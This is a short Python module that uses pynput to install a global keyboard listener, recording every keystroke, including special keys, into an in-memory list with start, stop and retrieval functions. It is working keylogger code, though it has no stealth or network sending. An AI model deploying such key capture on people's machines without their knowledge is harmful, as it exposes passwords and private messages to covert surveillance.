from pynput import keyboard

logged_keys = []
listener = None


def on_press(key):
    try:
        # Printable characters
        if key.char is not None:
            logged_keys.append(key.char)
    except AttributeError:
        # Special keys
        if key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.enter:
            logged_keys.append("\n")
        elif key == keyboard.Key.backspace:
            logged_keys.append("[BACKSPACE]")
        else:
            logged_keys.append(f"[{key.name}]")


def start_logging():
    global listener
    logged_keys.clear()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()


def stop_logging():
    global listener
    if listener:
        listener.stop()
        listener = None


def get_logs():
    # Extra safety filter
    return "".join([k for k in logged_keys if isinstance(k, str)])
